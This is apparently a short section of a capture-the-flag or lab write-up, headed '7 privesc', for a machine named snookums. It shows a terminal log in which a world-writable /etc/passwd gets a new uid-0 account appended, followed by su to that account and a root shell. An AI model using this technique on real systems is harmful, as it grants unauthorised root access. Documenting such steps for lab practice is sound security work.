# 7 privesc

```
[michael@snookums k]$ ls -la /etc/passwd
-rw-r--r--. 1 michael root 1162 Jun 22 15:30 /etc/passwd

[michael@snookums k]$ echo 'kashz:cAZZtf3ncxRAY:0:0:root:/root:/bin/bash' >> /etc/passwd
[michael@snookums k]$ su kashz
Password:
[root@snookums k]# whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
snookums
```
